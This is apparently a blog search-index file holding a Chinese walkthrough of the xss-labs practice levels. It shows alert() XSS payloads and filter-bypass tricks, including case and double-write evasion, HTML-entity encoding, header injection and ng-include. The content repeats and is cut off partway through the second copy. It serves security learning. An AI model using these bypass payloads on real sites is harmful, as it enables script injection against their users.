<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>XSS</title>
    <link href="/kele6.github.io/2024/04/15/xss/"/>
    <url>/kele6.github.io/2024/04/15/xss/</url>
    
    <content type="html"><![CDATA[<h1 id="xsslabs"><a href="#xsslabs" class="headerlink" title="xsslabs"></a>xsslabs</h1><p><em>参考链接：<a href="https://blog.csdn.net/ytdd66/article/details/136946635">https://blog.csdn.net/ytdd66/article/details/136946635</a></em></p><p><em>参考链接：<a href="https://blog.csdn.net/ytdd66/article/details/136946635">https://blog.csdn.net/ytdd66/article/details/136946635</a></em></p><h2 id="level-1—–无过滤"><a href="#level-1—–无过滤" class="headerlink" title="level-1—–无过滤"></a>level-1—–无过滤</h2><p>无过滤直接：<script>alert(""我什么都不会"");</script></p><h2 id="level-2——闭合标签"><a href="#level-2——闭合标签" class="headerlink" title="level-2——闭合标签"></a>level-2——闭合标签</h2><p>闭合标签：<code>&quot;&gt;&lt;script&gt;alert(&quot;我是菜菜&quot;);&lt;/script&gt;</code></p><h2 id="level-3—–单引号闭合-js"><a href="#level-3—–单引号闭合-js" class="headerlink" title="level-3—–单引号闭合+js"></a>level-3—–单引号闭合+js</h2><p>单引号闭合+js：可能会对 “  &lt; &gt; 编码（即过滤）<br>可以js：’onclick&#x3D;’javascript:alert(“捞捞我吧”)’<br>‘onfocus&#x3D;’javascript:alert(“学不完，根本学不完”)’<br>‘onblur&#x3D;’javascript:alert(123)’                     (去掉单引号就要加&#x2F;&#x2F;或者&gt;)——–被过滤就不可了<br>后面加 &#x2F;&#x2F;  &gt; 也是可以的</p><h2 id="level-4—–双引号闭合-js"><a href="#level-4—–双引号闭合-js" class="headerlink" title="level-4—–双引号闭合+js"></a>level-4—–双引号闭合+js</h2><p>双引号闭合+js：<br>“onclick&#x3D;javascript:alert(“嘎”)&#x2F;&#x2F;<br>“onclick&#x3D;’javascript:alert(”佬佬带带“)’</p><h2 id="level-5-—–js伪协议"><a href="#level-5-—–js伪协议" class="headerlink" title="level-5 —–js伪协议"></a>level-5 —–js伪协议</h2><p>部分代码：</p><p>$str &#x3D; strtolower($_GET[“keyword”]);<br>$str2&#x3D;str_replace(“&lt;script”,”&lt;scr_ipt”,$str);<br>$str3&#x3D;str_replace(“on”,”o_n”,$str2);</p><p>js伪协议：发现script和on都被替换， 这一关我们利用<code>&lt;a&gt;</code>标签绕过进行绕过。<br>“&gt; <a href=javascript:alert(123)>xss</a></p><h2 id="level-6—–大小写绕过"><a href="#level-6—–大小写绕过" class="headerlink" title="level-6—–大小写绕过"></a>level-6—–大小写绕过</h2><p>大小写绕过：<br>‘“&gt;<a Href=javascript:alert(11)>aa</a>&#x2F;&#x2F;<br>“&gt; <ScripT>alert(1)</ScRipT></p><h2 id="level-7—–双写绕过"><a href="#level-7—–双写绕过" class="headerlink" title="level-7—–双写绕过"></a>level-7—–双写绕过</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php">`<span class="hljs-meta">&lt;?php</span>` <br>`***<span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);***`<br>`***<span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>];***`<br>`***<span class="hljs-variable">$str2</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&lt;script&quot;</span>,<span class="hljs-string">&quot;&lt;scr_ipt&quot;</span>,<span class="hljs-variable">$str</span>);***`<br>`***<span class="hljs-variable">$str3</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;on&quot;</span>,<span class="hljs-string">&quot;o_n&quot;</span>,<span class="hljs-variable">$str2</span>);***`<br>`***<span class="hljs-variable">$str4</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;src&quot;</span>,<span class="hljs-string">&quot;sr_c&quot;</span>,<span class="hljs-variable">$str3</span>);***`<br>`***<span class="hljs-variable">$str5</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;data&quot;</span>,<span class="hljs-string">&quot;da_ta&quot;</span>,<span class="hljs-variable">$str4</span>);***`<br>`***<span class="hljs-variable">$str6</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;href&quot;</span>,<span class="hljs-string">&quot;hr_ef&quot;</span>,<span class="hljs-variable">$str5</span>);***`<br></code></pre></td></tr></table></figure><p>$str2 变量通过 str_replace(“&lt;script”,”&lt;scr_ipt”,$str); 将字符串中的 &lt;script 替换为 &lt;scr_ipt，防止恶意脚本的注入。————其他的一样</p><p><strong>href被替换成空，所以我们可以想到，使用双写进行绕过</strong><br>“&gt;<scrscriptipt>alert(32);</scrscriptipt><br>‘“&gt;<a HRhrefEF='javascrscriptipt:alert("jaden")'>jaden</a></p><h2 id="level-8—–编码绕过"><a href="#level-8—–编码绕过" class="headerlink" title="level-8—–编码绕过"></a>level-8—–编码绕过</h2><p>发现内容输出在了a标签的href属性中，当我们测试的时候发现，javascript不仅加了_，并且使用了html实体编码，将特殊符号进行了编码，导致不能进行标签闭合，那么既然内容放到了某个标签的属性值里面，我们说过，属性值是可以进行编码绕过的，尝试html实体编码绕过。<br>javascript:alert(“jaden”)<br>编码：整个进行编码<br>采用<em><strong>十进制ascii码</strong></em><br>&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#34;&#106;&#97;&#100;&#101;&#110;&#34;&#41;<br>或者<em><strong>十六进制unicode编码</strong></em><br>&#x006a;&#x0061;&#x0076;&#x0061;&#x0073;&#x0063;&#x0072;&#x0069;&#x0070;&#x0074;<br>&#x003a;&#x0061;&#x006c;&#x0065;&#x0072;&#x0074;&#x0028;&#x0022;&#x006a;&#x0061;<br>&#x0064;&#x0065;&#x006e;&#x0022;&#x0029;</p><h2 id="level-9—–http协议校验-指定内容绕过"><a href="#level-9—–http协议校验-指定内容绕过" class="headerlink" title="level-9—–http协议校验(指定内容绕过)"></a>level-9—–http协议校验(指定内容绕过)</h2><p>发现，上面的这几种绕过方式都不行了，但是看到一个友情链接，写上一个正确的http网址可以看到输<br>出在了href属性中，也就是说，做了网址格式的校验，看后台代码发现其实就是http协议校验，那么我<br>们可以巧用js代码中的注释符号 &#x2F;&#x2F; 。</p><p>javascript:alert(“jaden”)&#x2F;&#x2F;<a href="http://www.baidu.com/">http://www.baidu.com</a> #但是前面的<br>javascript:alert(“jaden”)要进行编码，不然会被加上_<br>&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&amp;<br>#114;&#116;&#40;&#34;&#106;&#97;&#100;&#101;&#110;&#34;&#41;&#x2F;&#x2F;<a href="http://www.baidu.c/">http://www.baidu.c</a><br>om<br>&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#41;&#x2F;* http:&#x2F;&#x2F; *&#x2F;</p><p><em><strong>本关小结</strong>：插入指定内容（本关是http:&#x2F;&#x2F;）绕过检测，再将指定内容用注释符注释掉即可</em> </p><h2 id="level10—–get传参，隐藏的input标签可以插入type-”text”显示"><a href="#level10—–get传参，隐藏的input标签可以插入type-”text”显示" class="headerlink" title="level10—–get传参，隐藏的input标签可以插入type&#x3D;”text”显示"></a>level10—–get传参，隐藏的input标签可以插入type&#x3D;”text”显示</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>];<br><br><br><br><span class="hljs-variable">$str11</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;t_sort&quot;</span>];<br><br><br><br><span class="hljs-variable">$str22</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str11</span>);<br><br><br><br><span class="hljs-variable">$str33</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&lt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str22</span>);<br></code></pre></td></tr></table></figure><p>这两行代码对 $str11 变量进行字符串替换操作。首先，它移除了 $str11 中所有的 “&gt;” 字符，然后将结果存储在 $str22 中。接着，它移除了 $str22 中所有的 “&lt;” 字符，并将结果存储在 $str33 中首先，输出一个居中的 <h2> 标题，提示用户没有找到和 $str 相关的结果。这里使用htmlspecialchars() 函数来确保 $str 中的特殊字符被正确转义，接着，输出一个表单，其中包含了三个隐藏的输入字段：t_link、t_history 和 t_sort。前两个字段的值都被设置为空字符串，而第三个字段的值被设置为 $str33（即处理过的 $str11）<img src="https://img-blog.csdnimg.cn/direct/a10df435b4a94be4a3481e1d99d71d71.png" alt="img"></p><p>修改为text<img src="https://img-blog.csdnimg.cn/direct/a10df435b4a94be4a3481e1d99d71d71.png" alt="img"></p><p><strong>payload:?t_sort&#x3D;onfocus&#x3D;javascript:alert() type&#x3D;”text”</strong></p><p><em><strong>小结：根据源码猜解传参的参数名，隐藏的input标签可以插入type&#x3D;”text”显示</strong></em></p><h2 id="level-11—–referer"><a href="#level-11—–referer" class="headerlink" title="level-11—–referer"></a>level-11—–referer</h2><p><input>标签有四个值，都做了隐藏处理，不难看出，第四个名为t_ref的<input>标签是http头referer的参数（就是由啥地址转跳到这里的，http头的referer会记录有），我们先做个简单的测试来验证一下前面三个标签名，GET与POST传参都试一下看看（<strong>都不行</strong>）<br><strong>那应该就referer头了，用burpsuite抓包一下，添加http头</strong><br>Referer: “ sRc DaTa OnFocus <sCriPt> <a hReF=javascript:alert()> &#106;<br>对比发现，把大于小于号><给删掉了，但是我们还能用onfocus，构造一个http头：<br>Referer: " onfocus=javascript:alert() type="text<br><strong>本关小结</strong>：考虑一下http头传值，本关是referer，但接下来也有可能是其他头，如Cookie等</p><h2 id="level-12-User-Agent头"><a href="#level-12-User-Agent头" class="headerlink" title="level-12-----User-Agent头"></a>level-12-----User-Agent头</h2><p>User-Agent: " onfocus=javascript:alert() type="text</p><h2 id="level-13-Cookie头"><a href="#level-13-Cookie头" class="headerlink" title="level-13-----Cookie头"></a>level-13-----Cookie头</h2><p>Cookie：" onclick=alert() type="text </p><h2 id="level-14-Pass"><a href="#level-14-Pass" class="headerlink" title="level-14-----Pass"></a>level-14-----Pass</h2><h2 id="level-15-ng-include文件包涵，可以无视html实体化"><a href="#level-15-ng-include文件包涵，可以无视html实体化" class="headerlink" title="level-15-----ng-include文件包涵，可以无视html实体化"></a>level-15-----ng-include文件包涵，可以无视html实体化<img src="https://img-blog.csdnimg.cn/ff0bfa43bf4d454e881ce358844c9651.png" alt="img"></h2><p>ng-include 指令用于包含外部的 HTML 文件。<br>包含的内容将作为指定元素的子节点。--------<em><strong>ng-include指令就是文件包涵的意思，用来包涵外部的html文件，如果包涵的内容是地址，需要加引号</strong></em><br>ng-include 属性的值可以是一个表达式，返回一个文件名。<br>默认情况下，包含的文件需要包含在同一个域名下。</p><p>语法<br>< element  ng-include= "filename"  οnlοad= "expression"  autoscroll= "expression"  > < /element ><br>ng-include 指令作为元素使用:</p><p>< ng-include  src= "filename"  οnlοad= "expression"  autoscroll= "expression"  > < /ng-include ><br>所有的 HTML 元素都支持该指令。</p><p>参数值<br>值:描述<br>filename:文件名，可以使用表达式来返回文件名。<br>onload:可选， 文件载入后执行的表达式。<br>autoscroll:可选，包含的部分是否在指定视图上可滚动。</p><p>原文链接：https://blog.csdn.net/u011127019/article/details/53666528/</p><p><strong>开始做题：</strong><br><strong>1</strong>.我们先试试看包涵第一关，构建payload：?src='/level1.php'<br><img src="https://img-blog.csdnimg.cn/2f2dd7d829ab4796a3f99eb55c5f6a79.png" alt="img"></p><p>所以可以随便包涵之前的一关并对其传参，以达到弹窗的效果，先测试一下过滤了啥，构造payload<br>?src=" ' sRc DaTa OnFocus <sCriPt> <a hReF=javascript:alert()> &#106;<br><img src="https://img-blog.csdnimg.cn/4824b5a8ac984052b118e85e0ef7d723.png" alt="img"></p><p>**2.**对比发现，这里有个html实体化函数在，没有删掉东西，所以不影响我们接下来的操作，我们可以包涵第一关并让第一关弹窗（注意，这里不能包涵那些直接弹窗的东西如<script>，但是可以包涵那些标签的东西比如<a>、<input>、<img>、<p>标签等等，这些标签是能需要我们手动点击弹窗的），这里我们使用img标签，可参考XSS常见的触发标签，构造payload ：?src='/level1.php?name=<img src=1 onmouseover=alert()>'<br>**3.**当鼠标移动到图片的时候就触发了弹窗<br><img src="https://img-blog.csdnimg.cn/16343a7a36204eb9883842c0fade4146.png" alt="img"></p><p>当然也能用p标签，可以构造payload：?src='/level1.php?name=<p onmousedown=alert()>哈哈哈</p>'<br>点击哈哈哈即可弹窗，接下来我们看一下这关的后端源码<br><img src="https://img-blog.csdnimg.cn/454dfa88edfc4ef8be18f846f5b6aff8.png" alt="img"></p><h2 id="level-16-回车代替空格绕过检测"><a href="#level-16-回车代替空格绕过检测" class="headerlink" title="level-16-----回车代替空格绕过检测"></a>level-16-----回车代替空格绕过检测</h2><p><strong>1.</strong><img src="https://img-blog.csdnimg.cn/3cc75094c9d4495eac9cbb7bfa8c7e17.png" alt="img"></p><p>test插入到了center标签中，所以这里就不用闭合了，老规矩，先测试一波关键字：?keyword=" ' sRc DaTa OnFocus OnmOuseOver OnMouseDoWn P <sCriPt> <a hReF=javascript:alert()> &#106;<br><img src="https://img-blog.csdnimg.cn/1c858bc16fc34042bc3339a2124fb943.png" alt="img"></p><p>**2.**对比发现，这里先是将字母小写化了，再把script替换成空格，最后将空格给实体化，想尝试一下p标签<p οnmοusedοwn=alert()>abc</p>，谁知道也将/给替换成了空格，无奈，只好看一下后端源码<br><img src="https://img-blog.csdnimg.cn/4875db556db94229b0c30d9c6597970c.png" alt="img"></p><p>**3.**果然给过掉了，空格可以用回车来代替绕过，回车的url编码是%0a，再配合上不用/的<img>、<details>、<svg>等标签，更多标签可参考<a href="https://blog.csdn.net/LYJ20010728/article/details/116462782">XSS常见的触发标签</a></p><p>随便选个标签，将空格替换成回车的url编码，构造payload  ?keyword=<svg%0Aonload=alert(1)></p><h2 id="level-17-embed标签"><a href="#level-17-embed标签" class="headerlink" title="level-17-----embed标签"></a>level-17-----embed标签</h2><p><img src="https://img-blog.csdnimg.cn/direct/ab709436b35c413e909e51e4b0c0a62d.png" alt="img"></p><p>这个传入了两个值，分别作为src中的xsf01.swf的变量和值传入,观察一下发现这个embed  标签就是引入一个  swf  文件到浏览器端，并且它的  src  属性值没有添 </p><p>  加引号所以 不用闭合。 </p><p>构造payload</p><p>' οnclick=alert()<br><img src="https://img-blog.csdnimg.cn/direct/be82d9feca8f41d5ab6ae37fd01d6c57.png" alt="img"></p><h2 id="level-18-同17"><a href="#level-18-同17" class="headerlink" title="level-18-----同17"></a>level-18-----同17</h2><h2 id="level-19-Pass"><a href="#level-19-Pass" class="headerlink" title="level-19-----Pass"></a>level-19-----Pass</h2><h2 id="level-20-Pass"><a href="#level-20-Pass" class="headerlink" title="level-20-----Pass"></a>level-20-----Pass</h2><h1 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h1><h2 id="level-2-闭合标签"><a href="#level-2-闭合标签" class="headerlink" title="level-2------闭合标签"></a>level-2------闭合标签</h2><p>闭合标签："><script>alert(123);</script></p><h2 id="level-3—–单引号闭合-js-1"><a href="#level-3—–单引号闭合-js-1" class="headerlink" title="level-3—–单引号闭合+js"></a>level-3—–单引号闭合+js</h2><p>单引号闭合+js：可能会对 “  &lt; &gt; 编码（即过滤）<br>可以js：’onclick&#x3D;’javascript:alert(123)’<br>‘onfocus&#x3D;’javascript:alert(123)’<br>‘onblur&#x3D;’javascript:alert(123)’                     (去掉单引号就要加&#x2F;&#x2F;或者&gt;)——–被过滤就不可了<br>后面加 &#x2F;&#x2F;  &gt; 也是可以的</p><h2 id="level-4—–双引号闭合-js-1"><a href="#level-4—–双引号闭合-js-1" class="headerlink" title="level-4—–双引号闭合+js"></a>level-4—–双引号闭合+js</h2><p>双引号闭合+js：<br>“onclick&#x3D;javascript:alert(1)&#x2F;&#x2F;<br>“onclick&#x3D;’javascript:alert(1)’</p><h2 id="level-5-—–js伪协议-1"><a href="#level-5-—–js伪协议-1" class="headerlink" title="level-5 —–js伪协议"></a>level-5 —–js伪协议</h2><p>部分代码：</p><p>$str &#x3D; strtolower($_GET[“keyword”]);<br>$str2&#x3D;str_replace(“&lt;script”,”&lt;scr_ipt”,$str);<br>$str3&#x3D;str_replace(“on”,”o_n”,$str2);</p><p>js伪协议：发现script和on都被替换， 这一关我们利用<code>&lt;a&gt;</code>标签绕过进行绕过。<br>“&gt; <a href=javascript:alert(123)>xss</a></p><h2 id="level-6—–大小写绕过-1"><a href="#level-6—–大小写绕过-1" class="headerlink" title="level-6—–大小写绕过"></a>level-6—–大小写绕过</h2><p>大小写绕过：<br>‘“&gt;<a Href=javascript:alert(11)>aa</a>&#x2F;&#x2F;<br>“&gt; <ScripT>alert(1)</ScRipT></p><h2 id="level-7—–双写绕过-1"><a href="#level-7—–双写绕过-1" class="headerlink" title="level-7—–双写绕过"></a>level-7—–双写绕过</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php">`<span class="hljs-meta">&lt;?php</span>` <br>`***<span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);***`<br>`***<span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>];***`<br>`***<span class="hljs-variable">$str2</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&lt;script&quot;</span>,<span class="hljs-string">&quot;&lt;scr_ipt&quot;</span>,<span class="hljs-variable">$str</span>);***`<br>`***<span class="hljs-variable">$str3</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;on&quot;</span>,<span class="hljs-string">&quot;o_n&quot;</span>,<span class="hljs-variable">$str2</span>);***`<br>`***<span class="hljs-variable">$str4</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;src&quot;</span>,<span class="hljs-string">&quot;sr_c&quot;</span>,<span class="hljs-variable">$str3</span>);***`<br>`***<span class="hljs-variable">$str5</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;data&quot;</span>,<span class="hljs-string">&quot;da_ta&quot;</span>,<span class="hljs-variable">$str4</span>);***`<br>`***<span class="hljs-variable">$str6</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;href&quot;</span>,<span class="hljs-string">&quot;hr_ef&quot;</span>,<span class="hljs-variable">$str5</span>);***`<br></code></pre></td></tr></table></figure><p>$str2 变量通过 str_replace(“&lt;script”,”&lt;scr_ipt”,$str); 将字符串中的 &lt;script 替换为 &lt;scr_ipt，防止恶意脚本的注入。————其他的一样</p><p><strong>href被替换成空，所以我们可以想到，使用双写进行绕过</strong><br>“&gt;<scrscriptipt>alert(32);</scrscriptipt><br>‘“&gt;<a HRhrefEF='javascrscriptipt:alert("jaden")'>jaden</a></p><h2 id="level-8—–编码绕过-1"><a href="#level-8—–编码绕过-1" class="headerlink" title="level-8—–编码绕过"></a>level-8—–编码绕过</h2><p>发现内容输出在了a标签的href属性中，当我们测试的时候发现，javascript不仅加了_，并且使用了html实体编码，将特殊符号进行了编码，导致不能进行标签闭合，那么既然内容放到了某个标签的属性值里面，我们说过，属性值是可以进行编码绕过的，尝试html实体编码绕过。<br>javascript:alert(“jaden”)<br>编码：整个进行编码<br>采用<em><strong>十进制ascii码</strong></em><br>&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#34;&#106;&#97;&#100;&#101;&#110;&#34;&#41;<br>或者<em><strong>十六进制unicode编码</strong></em><br>&#x006a;&#x0061;&#x0076;&#x0061;&#x0073;&#x0063;&#x0072;&#x0069;&#x0070;&#x0074;<br>&#x003a;&#x0061;&#x006c;&#x0065;&#x0072;&#x0074;&#x0028;&#x0022;&#x006a;&#x0061;<br>&#x0064;&#x0065;&#x006e;&#x0022;&#x0029;</p><h2 id="level-9—–http协议校验-指定内容绕过-1"><a href="#level-9—–http协议校验-指定内容绕过-1" class="headerlink" title="level-9—–http协议校验(指定内容绕过)"></a>level-9—–http协议校验(指定内容绕过)</h2><p>发现，上面的这几种绕过方式都不行了，但是看到一个友情链接，写上一个正确的http网址可以看到输<br>出在了href属性中，也就是说，做了网址格式的校验，看后台代码发现其实就是http协议校验，那么我<br>们可以巧用js代码中的注释符号 &#x2F;&#x2F; 。</p><p>javascript:alert(“jaden”)&#x2F;&#x2F;<a href="http://www.baidu.com/">http://www.baidu.com</a> #但是前面的<br>javascript:alert(“jaden”)要进行编码，不然会被加上_<br>&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&amp;<br>#114;&#116;&#40;&#34;&#106;&#97;&#100;&#101;&#110;&#34;&#41;&#x2F;&#x2F;<a href="http://www.baidu.c/">http://www.baidu.c</a><br>om<br>&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#41;&#x2F;* http:&#x2F;&#x2F; *&#x2F;</p><p><em><strong>本关小结</strong>：插入指定内容（本关是http:&#x2F;&#x2F;）绕过检测，再将指定内容用注释符注释掉即可</em> </p><h2 id="level10—–get传参，隐藏的input标签可以插入type-”text”显示-1"><a href="#level10—–get传参，隐藏的input标签可以插入type-”text”显示-1" class="headerlink" title="level10—–get传参，隐藏的input标签可以插入type&#x3D;”text”显示"></a>level10—–get传参，隐藏的input标签可以插入type&#x3D;”text”显示</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>];<br><br><br><br><span class="hljs-variable">$str11</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;t_sort&quot;</span>];<br><br><br><br><span class="hljs-variable">$str22</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str11</span>);<br><br><br><br><span class="hljs-variable">$str33</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&lt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str22</span>);<br></code></pre></td></tr></table></figure><p>这两行代码对 $str11 变量进行字符串替换操作。首先，它移除了 $str11 中所有的 “&gt;” 字符，然后将结果存储在 $str22 中。接着，它移除了 $str22 中所有的 “&lt;” 字符，并将结果存储在 $str33 中首先，输出一个居中的 <h2> 标题，提示用户没有找到和 $str 相关的结果。这里使用htmlspecialchars() 函数来确保 $str 中的特殊字符被正确转义，接着，输出一个表单，其中包含了三个隐藏的输入字段：t_link、t_history 和 t_sort。前两个字段的值都被设置为空字符串，而第三个字段的值被设置为 $str33（即处理过的 $str11）<img src="https://img-blog.csdnimg.cn/direct/a10df435b4a94be4a3481e1d99d71d71.png" alt="img"></p><p>修改为text<img src="https://img-blog.csdnimg.cn/direct/a10df435b4a94be4a3481e1d99d71d71.png" alt="img"></p><p><strong>payload:?t_sort&#x3D;onfocus&#x3D;javascript:alert() type&#x3D;”text”</strong></p><p><em><strong>小结：根据源码猜解传参的参数名，隐藏的input标签可以插入type&#x3D;”text”显示</strong></em></p><h2 id="level-11—–referer-1"><a href="#level-11—–referer-1" class="headerlink" title="level-11—–referer"></a>level-11—–referer</h2><p><input>标签有四个值，都做了隐藏处理，不难看出，第四个名为t_ref的<input>标签是http头referer的参数（就是由啥地址转跳到这里的，http头的referer会记录有），我们先做个简单的测试来验证一下前面三个标签名，GET与POST传参都试一下看看（<strong>都不行</strong>）<br><strong>那应该就referer头了，用burpsuite抓包一下，添加http头</strong><br>Referer: “ sRc DaTa OnFocus <sCriPt> <a hReF=javascript:alert()> &#106;<br>对比发现，把大于小于号><给删掉了，但是我们还能用onfocus，构造一个http头：<br>Referer: " onfocus=javascript:alert() type="text<br><strong>本关小结</strong>：考虑一下http头传值，本关是referer，但接下来也有可能是其他头，如Cookie等</p><h2 id="level-12-User-Agent头-1"><a href="#level-12-User-Agent头-1" class="headerlink" title="level-12-----User-Agent头"></a>level-12-----User-Agent头</h2><p>User-Agent: " onfocus=javascript:alert() type="text</p><h2 id="level-13-Cookie头-1"><a href="#level-13-Cookie头-1" class="headerlink" title="level-13-----Cookie头"></a>level-13-----Cookie头</h2><p>Cookie：" onclick=alert() type="text </p><h2 id="level-14-Pass-1"><a href="#level-14-Pass-1" class="headerlink" title="level-14-----Pass"></a>level-14-----Pass</h2><h2 id="level-15-ng-include文件包涵，可以无视html实体化-1"><a href="#level-15-ng-include文件包涵，可以无视html实体化-1" class="headerlink" title="level-15-----ng-include文件包涵，可以无视html实体化"></a>level-15-----ng-include文件包涵，可以无视html实体化<img src="https://img-blog.csdnimg.cn/ff0bfa43bf4d454e881ce358844c9651.png" alt="img"></h2><p>ng-include 指令用于包含外部的 HTML 文件。<br>包含的内容将作为指定元素的子节点。--------<em><strong>ng-include指令就是文件包涵的意思，用来包涵外部的html文件，如果包涵的内容是地址，需要加引号</strong></em><br>ng-include 属性的值可以是一个表达式，返回一个文件名。<br>默认情况下，包含的文件需要包含在同一个域名下。</p><p>语法<br>< element  ng-include= "filename"  οnlοad= "expression"  autoscroll= "expression"  > < /element ><br>ng-include 指令作为元素使用:</p><p>< ng-include  src= "filename"  οnlοad= "expression"  autoscroll= "expression"  > < /ng-include ><br>所有的 HTML 元素都支持该指令。</p><p>参数值<br>值:描述<br>filename:文件名，可以使用表达式来返回文件名。<br>onload:可选， 文件载入后执行的表达式。<br>autoscroll:可选，包含的部分是否在指定视图上可滚动。</p><p>原文链接：https://blog.csdn.net/u011127019/article/details/53666528/</p><p><strong>开始做题：</strong><br><strong>1</strong>.我们先试试看包涵第一关，构建payload：?src='/level1.php'<br><img src="https://img-blog.csdnimg.cn/2f2dd7d829ab4796a3f99eb55c5f6a79.png" alt="img"></p><p>所以可以随便包涵之前的一关并对其传参，以达到弹窗的效果，先测试一下过滤了啥，构造payload<br>?src=" ' sRc DaTa OnFocus <sCriPt> <a hReF=javascript:alert()> &#106;<br><img src="https://img-blog.csdnimg.cn/4824b5a8ac984052b118e85e0ef7d723.png" alt="img"></p><p>**2.**对比发现，这里有个html实体化函数在，没有删掉东西，所以不影响我们接下来的操作，我们可以包涵第一关并让第一关弹窗（注意，这里不能包涵那些直接弹窗的东西如<script>，但是可以包涵那些标签的东西比如<a>、<input>、<img>、<p>标签等等，这些标签是能需要我们手动点击弹窗的），这里我们使用img标签，可参考XSS常见的触发标签，构造payload ：?src='/level1.php?name=<img src=1 onmouseover=alert()>'<br>**3.**当鼠标移动到图片的时候就触发了弹窗<br><img src="https://img-blog.csdnimg.cn/16343a7a36204eb9883842c0fade4146.png" alt="img"></p><p>当然也能用p标签，可以构造payload：?src='/level1.php?name=<p onmousedown=alert()>哈哈哈</p>'<br>点击哈哈哈即可弹窗，接下来我们看一下这关的后端源码<br><img src="https://img-blog.csdnimg.cn/454dfa88edfc4ef8be18f846f5b6aff8.png" alt="img"></p><h2 id="level-16-回车代替空格绕过检测-1"><a href="#level-16-回车代替空格绕过检测-1" class="headerlink" title="level-16-----回车代替空格绕过检测"></a>level-16-----回车代替空格绕过检测</h2><p><strong>1.</strong><img src="https://img-blog.csdnimg.cn/3cc75094c9d4495eac9cbb7bfa8c7e17.png" alt="img"></p><p>test插入到了center标签中，所以这里就不用闭合了，老规矩，先测试一波关键字：?keyword=" ' sRc DaTa OnFocus OnmOuseOver OnMouseDoWn P <sCriPt> <a hReF=javascript:alert()> &#106;<br><img src="https://img-blog.csdnimg.cn/1c858bc16fc34042bc3339a2124fb943.png" alt="img"></p><p>**2.**对比发现，这里先是将字母小写化了，再把script替换成空格，最后将空格给实体化，想尝试一下p标签<p οnmοusedοwn=alert()>abc</p>，谁知道也将/给替换成了空格，无奈，只好看一下后端源码<br><img src="https://img-blog.csdnimg.cn/4875db556db94229b0c30d9c6597970c.png" alt="img"></p><p>**3.**果然给过掉了，空格可以用回车来代替绕过，回车的url编码是%0a，再配合上不用/的<img>、<details>、<svg>等标签，更多标签可参考<a 